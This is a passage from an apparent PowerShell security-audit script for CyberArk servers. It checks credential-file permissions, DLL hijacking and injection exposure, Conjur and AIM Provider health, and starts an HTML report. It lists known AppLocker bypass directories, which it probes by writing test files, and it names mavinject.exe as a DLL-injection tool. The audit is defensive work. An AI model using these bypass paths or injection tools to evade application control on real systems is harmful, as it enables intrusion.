        Add-SkippedCheck -Category "CPM Hardening" -CISControl "CPMH1" `
            -CheckName "CPM Hardening Checks" `
            -Reason "Not a CPM server - checks not applicable" `
            -Type "NotApplicable"
        return
    }

    Test-CPMFIPSCryptography
    Test-CPMDEPConfiguration
    Test-CPMCredentialFiles
    Test-CPMServiceAccount
}

function Test-CPMFIPSCryptography {
    Write-AuditLog "Checking CPM FIPS cryptography (CPMH1)..." -Level Info

    try {
        $fipsEnabled = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\FipsAlgorithmPolicy" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled

        if ($script:Config.RequireFIPS -and $fipsEnabled -ne 1) {
            Add-Finding -Category "CPM Hardening" `
                -CISControl "CPMH1" `
                -Finding "FIPS cryptography not enabled" `
                -Resource "CPM Cryptography" `
                -CurrentValue "FIPS disabled" `
                -ExpectedValue "FIPS enabled" `
                -Recommendation "Enable FIPS cryptography mode for CPM" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "CPM Hardening" `
                -CISControl "CPMH1" `
                -Finding "FIPS cryptography configuration" `
                -Resource "CPM Cryptography" `
                -CurrentValue $(if ($fipsEnabled -eq 1) { "Enabled" } else { "Disabled" }) `
                -ExpectedValue "Per organizational policy" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "CPM Hardening" -CISControl "CPMH1" `
            -CheckName "FIPS Cryptography" `
            -Reason "Error checking FIPS: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-CPMDEPConfiguration {
    Write-AuditLog "Checking CPM DEP configuration (CPMH2)..." -Level Info

    try {
        $bcdedit = bcdedit /enum 2>$null | Out-String
        $depEnabled = $bcdedit -match "nx\s+OptIn|nx\s+OptOut|nx\s+AlwaysOn"

        if (-not $depEnabled) {
            Add-Finding -Category "CPM Hardening" `
                -CISControl "CPMH2" `
                -Finding "DEP may not be properly configured" `
                -Resource "Data Execution Prevention" `
                -CurrentValue "DEP status unclear" `
                -ExpectedValue "DEP enabled (OptIn or OptOut)" `
                -Recommendation "Verify DEP is enabled for CPM security" `
                -Severity "Medium"
        }
        else {
            Add-Finding -Category "CPM Hardening" `
                -CISControl "CPMH2" `
                -Finding "DEP is configured" `
                -Resource "Data Execution Prevention" `
                -CurrentValue "DEP enabled" `
                -ExpectedValue "DEP enabled" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "CPM Hardening" -CISControl "CPMH2" `
            -CheckName "DEP Configuration" `
            -Reason "Error checking DEP: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-CPMCredentialFiles {
    Write-AuditLog "Checking CPM credential file hardening (CPMH3)..." -Level Info

    try {
        $cpmPath = "C:\Program Files (x86)\CyberArk\Password Manager"
        $credFiles = Get-ChildItem -Path $cpmPath -Filter "*.cred" -Recurse -ErrorAction SilentlyContinue

        if ($credFiles.Count -gt 0) {
            $issues = @()
            foreach ($file in $credFiles) {
                $acl = Get-Acl $file.FullName -ErrorAction SilentlyContinue
                foreach ($ace in $acl.Access) {
                    if ($ace.IdentityReference -match "Everyone|Users") {
                        if ($ace.FileSystemRights -match "Read|FullControl") {
                            $issues += "$($file.Name) readable by $($ace.IdentityReference)"
                        }
                    }
                }
            }

            if ($issues.Count -gt 0) {
                Add-Finding -Category "CPM Hardening" `
                    -CISControl "CPMH3" `
                    -Finding "CPM credential files have weak permissions" `
                    -Resource "Credential Files" `
                    -CurrentValue "$($issues.Count) issues found" `
                    -ExpectedValue "Restrictive permissions" `
                    -Recommendation "Restrict access to CPM credential files" `
                    -Severity "Critical"
            }
            else {
                Add-Finding -Category "CPM Hardening" `
                    -CISControl "CPMH3" `
                    -Finding "CPM credential files properly secured" `
                    -Resource "Credential Files" `
                    -CurrentValue "Restrictive permissions" `
                    -ExpectedValue "Secured" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "CPM Hardening" -CISControl "CPMH3" `
            -CheckName "Credential Files" `
            -Reason "Error checking credential files: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-CPMServiceAccount {
    Write-AuditLog "Checking CPM service account (CPMH4)..." -Level Info

    try {
        $cpmServices = @(
            "CyberArk Password Manager",
            "CyberArk Central Policy Manager Scanner"
        )

        foreach ($svcName in $cpmServices) {
            $service = Get-WmiObject -Class Win32_Service -Filter "Name='$svcName'" -ErrorAction SilentlyContinue
            
            if ($service) {
                $serviceAccount = $service.StartName
                
                if ($serviceAccount -eq "LocalSystem") {
                    Add-Finding -Category "CPM Hardening" `
                        -CISControl "CPMH4" `
                        -Finding "CPM service running as LocalSystem" `
                        -Resource $svcName `
                        -CurrentValue $serviceAccount `
                        -ExpectedValue "Dedicated local service account" `
                        -Recommendation "Configure CPM service to use dedicated local account" `
                        -Severity "Medium"
                }
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "CPM Hardening" -CISControl "CPMH4" `
            -CheckName "CPM Service Account" `
            -Reason "Error checking service: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# APPLICATION CONTROL CHECKS (APPCTL1-APPCTL5) - Evasor-inspired
#======================================================================

function Test-ApplicationControl {
    Write-AuditLog "Running Application Control Checks (Evasor-inspired)..." -Level Info

    Test-DLLInjectionVulnerability
    Test-DLLHijackingRisk
    Test-ResourceHijacking
    Test-AppLockerBypassPaths
    Test-WritableSystemPaths
}

function Test-DLLInjectionVulnerability {
    Write-AuditLog "Checking for DLL injection vulnerabilities (APPCTL1)..." -Level Info

    try {
        # Check if mavinject.exe exists (Microsoft tool that can inject DLLs)
        $mavinject = "$env:SystemRoot\System32\mavinject.exe"
        
        if (Test-Path $mavinject) {
            # Get running processes that could be vulnerable
            $vulnerableProcesses = @()
            $processes = Get-Process | Where-Object { 
                $_.Path -and 
                $_.SessionId -ne 0 -and 
                $_.ProcessName -notmatch "System|Idle|csrss|smss|wininit|services|lsass"
            }

            # Check for processes running with lower integrity that could be targeted
            foreach ($proc in $processes) {
                try {
                    $procPath = $proc.Path
                    if ($procPath -match "CyberArk|PasswordVault") {
                        $vulnerableProcesses += $proc.ProcessName
                    }
                }
                catch { }
            }

            if ($vulnerableProcesses.Count -gt 0) {
                Add-Finding -Category "Application Control" `
                    -CISControl "APPCTL1" `
                    -Finding "CyberArk processes may be vulnerable to DLL injection" `
                    -Resource "Running Processes" `
                    -CurrentValue "$($vulnerableProcesses.Count) CyberArk processes: $(($vulnerableProcesses | Select-Object -Unique) -join ', ')" `
                    -ExpectedValue "Protected from DLL injection" `
                    -Recommendation "Implement AppLocker/WDAC policies; enable Protected Process Light where possible" `
                    -Severity "High"
            }
            else {
                Add-Finding -Category "Application Control" `
                    -CISControl "APPCTL1" `
                    -Finding "No CyberArk processes found for DLL injection check" `
                    -Resource "Running Processes" `
                    -CurrentValue "Verification required" `
                    -ExpectedValue "Protected processes" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Application Control" -CISControl "APPCTL1" `
            -CheckName "DLL Injection Vulnerability" `
            -Reason "Error checking DLL injection: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-DLLHijackingRisk {
    Write-AuditLog "Checking for DLL hijacking risks (APPCTL2)..." -Level Info

    try {
        $vulnerablePaths = @()
        
        # Check CyberArk installation directories for writable paths
        $cyberArkPaths = @(
            "C:\Program Files (x86)\CyberArk",
            "C:\Program Files\CyberArk",
            "C:\inetpub\wwwroot\PasswordVault"
        )

        foreach ($basePath in $cyberArkPaths) {
            if (Test-Path $basePath) {
                $dirs = Get-ChildItem -Path $basePath -Directory -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20
                
                foreach ($dir in $dirs) {
                    try {
                        $acl = Get-Acl $dir.FullName -ErrorAction SilentlyContinue
                        foreach ($ace in $acl.Access) {
                            if ($ace.IdentityReference -match "Users|Everyone|Authenticated Users") {
                                if ($ace.FileSystemRights -match "Write|Modify|FullControl") {
                                    $vulnerablePaths += $dir.FullName
                                    break
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
        }

        if ($vulnerablePaths.Count -gt 0) {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL2" `
                -Finding "Writable directories in CyberArk paths (DLL hijacking risk)" `
                -Resource "CyberArk Directories" `
                -CurrentValue "$($vulnerablePaths.Count) writable paths found" `
                -ExpectedValue "No user-writable directories" `
                -Recommendation "Remove write permissions for non-admin users on CyberArk directories" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL2" `
                -Finding "CyberArk directories properly secured" `
                -Resource "CyberArk Directories" `
                -CurrentValue "No writable paths for regular users" `
                -ExpectedValue "Secured directories" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Application Control" -CISControl "APPCTL2" `
            -CheckName "DLL Hijacking Risk" `
            -Reason "Error checking DLL hijacking: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-ResourceHijacking {
    Write-AuditLog "Checking for resource hijacking potential (APPCTL3)..." -Level Info

    try {
        # File extensions that could be hijacked for privilege escalation
        $dangerousExtensions = @("*.xml", "*.config", "*.bat", "*.cmd", "*.ps1", "*.vbs", "*.ini", "*.dll")
        $cyberArkPaths = @(
            "C:\Program Files (x86)\CyberArk",
            "C:\Program Files\CyberArk"
        )

        $replaceableFiles = @()

        foreach ($basePath in $cyberArkPaths) {
            if (Test-Path $basePath) {
                foreach ($ext in $dangerousExtensions) {
                    $files = Get-ChildItem -Path $basePath -Filter $ext -Recurse -ErrorAction SilentlyContinue | Select-Object -First 5
                    
                    foreach ($file in $files) {
                        try {
                            $acl = Get-Acl $file.FullName -ErrorAction SilentlyContinue
                            foreach ($ace in $acl.Access) {
                                if ($ace.IdentityReference -match "Users|Everyone") {
                                    if ($ace.FileSystemRights -match "Write|Modify|FullControl") {
                                        $replaceableFiles += $file.Name
                                        break
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
        }

        if ($replaceableFiles.Count -gt 0) {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL3" `
                -Finding "Replaceable resource files found" `
                -Resource "Configuration Files" `
                -CurrentValue "$($replaceableFiles.Count) files: $($replaceableFiles[0..4] -join ', ')$(if($replaceableFiles.Count -gt 5){'...'})" `
                -ExpectedValue "No user-writable config/script files" `
                -Recommendation "Lock down permissions on configuration and script files" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL3" `
                -Finding "No replaceable resource files found" `
                -Resource "Configuration Files" `
                -CurrentValue "Files properly secured" `
                -ExpectedValue "Secured files" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Application Control" -CISControl "APPCTL3" `
            -CheckName "Resource Hijacking" `
            -Reason "Error checking resource hijacking: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-AppLockerBypassPaths {
    Write-AuditLog "Checking for AppLocker bypass paths (APPCTL4)..." -Level Info

    try {
        # Known AppLocker bypass locations
        $bypassPaths = @(
            "$env:TEMP",
            "$env:USERPROFILE\Downloads",
            "C:\Windows\Tasks",
            "C:\Windows\Temp",
            "C:\Windows\tracing",
            "C:\Windows\System32\FxsTmp",
            "C:\Windows\System32\spool\drivers\color"
        )

        $writableBypassPaths = @()

        foreach ($path in $bypassPaths) {
            if (Test-Path $path) {
                try {
                    # Test if we can create files in this location
                    $testFile = Join-Path $path "applocker_test_$(Get-Random).tmp"
                    [IO.File]::WriteAllText($testFile, "test")
                    Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                    $writableBypassPaths += $path
                }
                catch { }
            }
        }

        if ($writableBypassPaths.Count -gt 0) {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL4" `
                -Finding "Writable AppLocker bypass paths found" `
                -Resource "File System" `
                -CurrentValue "$($writableBypassPaths.Count) paths: $($writableBypassPaths[0..2] -join ', ')$(if($writableBypassPaths.Count -gt 3){'...'})" `
                -ExpectedValue "Bypass paths blocked by AppLocker" `
                -Recommendation "Add AppLocker rules to block script execution from these locations" `
                -Severity "High"
        }
        else {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL4" `
                -Finding "AppLocker bypass paths secured" `
                -Resource "File System" `
                -CurrentValue "No writable bypass paths" `
                -ExpectedValue "Paths secured" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Application Control" -CISControl "APPCTL4" `
            -CheckName "AppLocker Bypass Paths" `
            -Reason "Error checking bypass paths: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-WritableSystemPaths {
    Write-AuditLog "Checking for writable system paths (APPCTL5)..." -Level Info

    try {
        # System paths that should not be writable
        $systemPaths = @(
            "$env:SystemRoot\System32",
            "$env:SystemRoot\SysWOW64",
            "$env:SystemRoot\Microsoft.NET"
        )

        $writablePaths = @()

        foreach ($path in $systemPaths) {
            if (Test-Path $path) {
                # Check a few subdirectories
                $subDirs = Get-ChildItem -Path $path -Directory -ErrorAction SilentlyContinue | Select-Object -First 10
                
                foreach ($dir in $subDirs) {
                    try {
                        $acl = Get-Acl $dir.FullName -ErrorAction SilentlyContinue
                        foreach ($ace in $acl.Access) {
                            if ($ace.IdentityReference -match "Users|Everyone") {
                                if ($ace.FileSystemRights -match "Write|Modify|FullControl") {
                                    $writablePaths += $dir.FullName
                                    break
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
        }

        $writableCount = $writablePaths.Count
        
        if ($writableCount -gt $script:Config.MaxWritableSystemPaths) {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL5" `
                -Finding "Writable system paths detected" `
                -Resource "System Directories" `
                -CurrentValue "$writableCount writable paths found" `
                -ExpectedValue "$($script:Config.MaxWritableSystemPaths) writable system paths" `
                -Recommendation "Review and restrict permissions on system directories" `
                -Severity "Critical"
        }
        else {
            Add-Finding -Category "Application Control" `
                -CISControl "APPCTL5" `
                -Finding "System paths properly secured" `
                -Resource "System Directories" `
                -CurrentValue "No unexpected writable paths" `
                -ExpectedValue "Secured system paths" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Application Control" -CISControl "APPCTL5" `
            -CheckName "Writable System Paths" `
            -Reason "Error checking system paths: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# CONJUR INTEGRATION CHECKS (SEC9-SEC14)
#======================================================================

function Test-ConjurIntegration {
    Write-AuditLog "Running Conjur/Secrets Manager Integration Checks..." -Level Info

    if (-not $ConjurUrl) {
        Add-SkippedCheck -Category "Conjur Integration" -CISControl "SEC9" `
            -CheckName "Conjur Integration Checks" `
            -Reason "Conjur URL not provided - use -ConjurUrl parameter" `
            -Type "Skipped"
        return
    }

    Test-ConjurHealth
    Test-ConjurAuthenticators
    Test-ConjurAPIKeyRotation
    Test-ConjurAuditLogging
}

function Test-ConjurHealth {
    Write-AuditLog "Checking Conjur health (SEC9)..." -Level Info

    try {
        $healthEndpoint = "$ConjurUrl/health"
        $response = Invoke-WebRequest -Uri $healthEndpoint -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop

        if ($response.StatusCode -eq 200) {
            $health = $response.Content | ConvertFrom-Json -ErrorAction SilentlyContinue
            
            if ($health.ok -eq $true -or $health.status -eq "ok") {
                Add-Finding -Category "Conjur Integration" `
                    -CISControl "SEC9" `
                    -Finding "Conjur health check passed" `
                    -Resource $ConjurUrl `
                    -CurrentValue "Healthy" `
                    -ExpectedValue "Healthy" `
                    -Severity "Info" `
                    -Status "Pass"
            }
            else {
                Add-Finding -Category "Conjur Integration" `
                    -CISControl "SEC9" `
                    -Finding "Conjur health check indicates issues" `
                    -Resource $ConjurUrl `
                    -CurrentValue $response.Content `
                    -ExpectedValue "All services healthy" `
                    -Recommendation "Investigate Conjur health issues" `
                    -Severity "High"
            }
        }
    }
    catch {
        Add-Finding -Category "Conjur Integration" `
            -CISControl "SEC9" `
            -Finding "Cannot reach Conjur health endpoint" `
            -Resource $ConjurUrl `
            -CurrentValue "Connection failed: $($_.Exception.Message)" `
            -ExpectedValue "Reachable health endpoint" `
            -Recommendation "Verify Conjur connectivity and configuration" `
            -Severity "High"
    }
}

function Test-ConjurAuthenticators {
    Write-AuditLog "Checking Conjur authenticator configuration (SEC11)..." -Level Info

    try {
        # Check for common authenticator endpoints
        $authenticators = @(
            @{ Name = "LDAP"; Path = "/authn-ldap" },
            @{ Name = "OIDC"; Path = "/authn-oidc" },
            @{ Name = "IAM"; Path = "/authn-iam" },
            @{ Name = "K8s"; Path = "/authn-k8s" }
        )

        $enabledAuthenticators = @()

        foreach ($auth in $authenticators) {
            try {
                $endpoint = "$ConjurUrl$($auth.Path)"
                $response = Invoke-WebRequest -Uri $endpoint -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue
                
                if ($response.StatusCode -ne 404) {
                    $enabledAuthenticators += $auth.Name
                }
            }
            catch {
                # 401/403 means endpoint exists but requires auth
                if ($_.Exception.Response.StatusCode.value__ -in @(401, 403)) {
                    $enabledAuthenticators += $auth.Name
                }
            }
        }

        if ($enabledAuthenticators.Count -gt 0) {
            Add-Finding -Category "Conjur Integration" `
                -CISControl "SEC11" `
                -Finding "Conjur authenticators detected" `
                -Resource "Authenticators" `
                -CurrentValue "$($enabledAuthenticators.Count) enabled: $($enabledAuthenticators -join ', ')" `
                -ExpectedValue "Required authenticators enabled" `
                -Recommendation "Verify only required authenticators are enabled" `
                -Severity "Info" `
                -Status "Pass"
        }
        else {
            Add-Finding -Category "Conjur Integration" `
                -CISControl "SEC11" `
                -Finding "No external authenticators detected" `
                -Resource "Authenticators" `
                -CurrentValue "Only default authentication" `
                -ExpectedValue "Enterprise authenticators configured" `
                -Recommendation "Consider enabling LDAP, OIDC, or other enterprise authenticators" `
                -Severity "Low"
        }
    }
    catch {
        Add-SkippedCheck -Category "Conjur Integration" -CISControl "SEC11" `
            -CheckName "Authenticator Configuration" `
            -Reason "Error checking authenticators: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-ConjurAPIKeyRotation {
    Write-AuditLog "Checking Conjur API key rotation (SEC13)..." -Level Info

    # This check documents the need for API key rotation - actual verification would require Conjur admin access
    Add-Finding -Category "Conjur Integration" `
        -CISControl "SEC13" `
        -Finding "API key rotation policy (manual verification)" `
        -Resource "API Keys" `
        -CurrentValue "Manual verification required" `
        -ExpectedValue "API keys rotated every $($script:Config.MaxConjurAPIKeyAgeDays) days" `
        -Recommendation "Implement automated API key rotation policy" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-ConjurAuditLogging {
    Write-AuditLog "Checking Conjur audit logging (SEC14)..." -Level Info

    try {
        # Check if audit endpoint is accessible
        $auditEndpoint = "$ConjurUrl/audit"
        
        try {
            $response = Invoke-WebRequest -Uri $auditEndpoint -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
            
            Add-Finding -Category "Conjur Integration" `
                -CISControl "SEC14" `
                -Finding "Conjur audit endpoint accessible" `
                -Resource "Audit Logging" `
                -CurrentValue "Audit endpoint reachable" `
                -ExpectedValue "Audit logging enabled" `
                -Recommendation "Verify audit logs are being forwarded to SIEM" `
                -Severity "Info" `
                -Status "Pass"
        }
        catch {
            # 401/403 means endpoint exists but requires auth - which is good
            if ($_.Exception.Response.StatusCode.value__ -in @(401, 403)) {
                Add-Finding -Category "Conjur Integration" `
                    -CISControl "SEC14" `
                    -Finding "Conjur audit endpoint secured" `
                    -Resource "Audit Logging" `
                    -CurrentValue "Requires authentication" `
                    -ExpectedValue "Secured audit access" `
                    -Severity "Info" `
                    -Status "Pass"
            }
            else {
                Add-Finding -Category "Conjur Integration" `
                    -CISControl "SEC14" `
                    -Finding "Cannot verify Conjur audit logging" `
                    -Resource "Audit Logging" `
                    -CurrentValue "Endpoint not accessible" `
                    -ExpectedValue "Audit logging enabled" `
                    -Recommendation "Verify Conjur audit logging configuration" `
                    -Severity "Medium"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Conjur Integration" -CISControl "SEC14" `
            -CheckName "Audit Logging" `
            -Reason "Error checking audit logging: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#======================================================================
# AIM PROVIDER CHECKS (MID7-MID9)
#======================================================================

function Test-AIMProviderSecurity {
    Write-AuditLog "Running AIM Provider Security Checks..." -Level Info

    Test-AIMProviderDeployment
    Test-AIMProviderConfiguration
    Test-AIMProviderConnectivity
}

function Test-AIMProviderDeployment {
    Write-AuditLog "Checking AIM Provider deployment (MID7)..." -Level Info

    try {
        # Check for AIM/CP installation
        $aimPaths = @(
            "C:\Program Files (x86)\CyberArk\ApplicationPasswordProvider",
            "C:\Program Files\CyberArk\ApplicationPasswordProvider",
            "C:\Program Files (x86)\CyberArk\ApplicationPasswordSdk",
            "C:\Program Files\CyberArk\ApplicationPasswordSdk"
        )

        $aimInstalled = $false
        $aimPath = $null

        foreach ($path in $aimPaths) {
            if (Test-Path $path) {
                $aimInstalled = $true
                $aimPath = $path
                break
            }
        }

        if ($aimInstalled) {
            # Check for running service
            $aimService = Get-Service -Name "CyberArk Application Password Provider" -ErrorAction SilentlyContinue

            if ($aimService -and $aimService.Status -eq "Running") {
                Add-Finding -Category "Machine Identity" `
                    -CISControl "MID7" `
                    -Finding "AIM Provider installed and running" `
                    -Resource "AIM Provider" `
                    -CurrentValue "Installed at $aimPath; Service: Running" `
                    -ExpectedValue "AIM Provider operational" `
                    -Severity "Info" `
                    -Status "Pass"
            }
            elseif ($aimService) {
                Add-Finding -Category "Machine Identity" `
                    -CISControl "MID7" `
                    -Finding "AIM Provider service not running" `
                    -Resource "AIM Provider" `
                    -CurrentValue "Service status: $($aimService.Status)" `
                    -ExpectedValue "Running" `
                    -Recommendation "Start the AIM Provider service" `
                    -Severity "High"
            }
            else {
                Add-Finding -Category "Machine Identity" `
                    -CISControl "MID7" `
                    -Finding "AIM Provider installed but service not found" `
                    -Resource "AIM Provider" `
                    -CurrentValue "Installation found at $aimPath" `
                    -ExpectedValue "Service registered and running" `
                    -Recommendation "Verify AIM Provider installation" `
                    -Severity "Medium"
            }
        }
        else {
            Add-Finding -Category "Machine Identity" `
                -CISControl "MID7" `
                -Finding "AIM Provider not installed on this server" `
                -Resource "AIM Provider" `
                -CurrentValue "Not installed" `
                -ExpectedValue "AIM Provider for application credential access" `
                -Recommendation "Deploy AIM Provider on application servers that need credential access" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID7" `
            -CheckName "AIM Provider Deployment" `
            -Reason "Error checking AIM Provider: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-AIMProviderConfiguration {
    Write-AuditLog "Checking AIM Provider configuration (MID8)..." -Level Info

    try {
        # Check for AIM configuration file
        $configPaths = @(
            "C:\Program Files (x86)\CyberArk\ApplicationPasswordProvider\Vault\vault.ini",
            "C:\Program Files\CyberArk\ApplicationPasswordProvider\Vault\vault.ini"
        )

        $configFound = $false

        foreach ($path in $configPaths) {
            if (Test-Path $path) {
                $configFound = $true
                
                # Check configuration file permissions
                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                $hasWeakPerms = $false
                
                foreach ($ace in $acl.Access) {
                    if ($ace.IdentityReference -match "Users|Everyone") {
                        if ($ace.FileSystemRights -match "Read|FullControl") {
                            $hasWeakPerms = $true
                        }
                    }
                }

                if ($hasWeakPerms) {
                    Add-Finding -Category "Machine Identity" `
                        -CISControl "MID8" `
                        -Finding "AIM Provider config has weak permissions" `
                        -Resource "vault.ini" `
                        -CurrentValue "Readable by non-admin users" `
                        -ExpectedValue "Restricted to administrators" `
                        -Recommendation "Restrict AIM Provider configuration file permissions" `
                        -Severity "High"
                }
                else {
                    Add-Finding -Category "Machine Identity" `
                        -CISControl "MID8" `
                        -Finding "AIM Provider configuration secured" `
                        -Resource "vault.ini" `
                        -CurrentValue "Properly secured" `
                        -ExpectedValue "Restricted permissions" `
                        -Severity "Info" `
                        -Status "Pass"
                }
                break
            }
        }

        if (-not $configFound) {
            Add-SkippedCheck -Category "Machine Identity" -CISControl "MID8" `
                -CheckName "AIM Provider Configuration" `
                -Reason "AIM Provider configuration file not found" `
                -Type "NotApplicable"
        }
    }
    catch {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID8" `
            -CheckName "AIM Provider Configuration" `
            -Reason "Error checking configuration: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-AIMProviderConnectivity {
    Write-AuditLog "Checking AIM Provider Vault connectivity (MID9)..." -Level Info

    try {
        # Check AIM Provider event log for connectivity status
        $aimEvents = Get-WinEvent -LogName Application -MaxEvents 50 -ErrorAction SilentlyContinue | 
            Where-Object { $_.ProviderName -match "CyberArk|AIM|ApplicationPassword" }

        if ($aimEvents) {
            $errorEvents = $aimEvents | Where-Object { $_.LevelDisplayName -eq "Error" }
            
            if ($errorEvents.Count -gt 0) {
                Add-Finding -Category "Machine Identity" `
                    -CISControl "MID9" `
                    -Finding "AIM Provider connectivity issues detected" `
                    -Resource "AIM Provider Events" `
                    -CurrentValue "$($errorEvents.Count) errors in recent events" `
                    -ExpectedValue "No connectivity errors" `
                    -Recommendation "Review AIM Provider logs and Vault connectivity" `
                    -Severity "High"
            }
            else {
                Add-Finding -Category "Machine Identity" `
                    -CISControl "MID9" `
                    -Finding "AIM Provider connectivity healthy" `
                    -Resource "AIM Provider Events" `
                    -CurrentValue "No recent errors" `
                    -ExpectedValue "Healthy connectivity" `
                    -Severity "Info" `
                    -Status "Pass"
            }
        }
        else {
            Add-Finding -Category "Machine Identity" `
                -CISControl "MID9" `
                -Finding "AIM Provider connectivity (manual verification)" `
                -Resource "AIM Provider" `
                -CurrentValue "No recent AIM events found" `
                -ExpectedValue "Verify Vault connectivity" `
                -Recommendation "Check AIM Provider logs for connectivity status" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
    catch {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID9" `
            -CheckName "AIM Provider Connectivity" `
            -Reason "Error checking connectivity: $($_.Exception.Message)" `
            -Type "Error"
    }
}

#endregion

#region Reporting

function Get-SeverityColor {
    param([string]$Severity)

    switch ($Severity) {
        "Critical" { return "#d63031" }
        "High"     { return "#e17055" }
        "Medium"   { return "#fdcb6e" }
        "Low"      { return "#74b9ff" }
        "Info"     { return "#81ecec" }
        default    { return "#dfe6e9" }
    }
}

function Get-StatusIcon {
    param([string]$Status)

    switch ($Status) {
        "Pass" { return "&#10004;" }
        "Fail" { return "&#10008;" }
        default { return "&#9679;" }
    }
}

function New-HTMLReport {
    Write-AuditLog "Generating HTML report..." -Level Info

    $reportDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $reportFileName = "CyberArk_Security_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
    $reportPath = Join-Path $OutputPath $reportFileName

    # Calculate statistics
    $criticalCount = ($script:Findings | Where-Object { $_.Severity -eq "Critical" -and $_.Status -eq "Fail" }).Count
    $highCount = ($script:Findings | Where-Object { $_.Severity -eq "High" -and $_.Status -eq "Fail" }).Count
    $mediumCount = ($script:Findings | Where-Object { $_.Severity -eq "Medium" -and $_.Status -eq "Fail" }).Count
    $lowCount = ($script:Findings | Where-Object { $_.Severity -eq "Low" -and $_.Status -eq "Fail" }).Count
    $passCount = ($script:Findings | Where-Object { $_.Status -eq "Pass" }).Count
    $skippedCount = $script:SkippedChecks.Count
    $naCount = ($script:SkippedChecks | Where-Object { $_.Type -eq "NotApplicable" }).Count
    $errorCount = ($script:SkippedChecks | Where-Object { $_.Type -eq "Error" }).Count

    # Risk score calculation
    $riskScore = ($criticalCount * 40) + ($highCount * 20) + ($mediumCount * 5) + ($lowCount * 1)
    $riskRating = if ($riskScore -eq 0) { "Excellent" }
                  elseif ($riskScore -lt 20) { "Good" }
                  elseif ($riskScore -lt 50) { "Fair" }
                  elseif ($riskScore -lt 100) { "Poor" }
                  else { "Critical" }

    $riskColor = switch ($riskRating) {
        "Excellent" { "#00b894" }
        "Good"      { "#00cec9" }
        "Fair"      { "#fdcb6e" }
        "Poor"      { "#e17055" }
        "Critical"  { "#d63031" }
    }

    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberArk Security Audit Report</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f6fa;
            color: #2d3436;
            line-height: 1.6;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background: linear-gradient(135deg, #2d3436 0%, #636e72 100%);
            color: white;
            padding: 40px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .header-meta {
            display: flex;
            gap: 30px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        .header-meta span {
            background: rgba(255,255,255,0.1);
            padding: 8px 16px;
            border-radius: 5px;
        }
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            text-align: center;
            transition: transform 0.3s ease;
        }
        .stat-card:hover {
            transform: translateY(-5px);
        }
        .stat-card .number {
            font-size: 3em;
            font-weight: bold;
        }
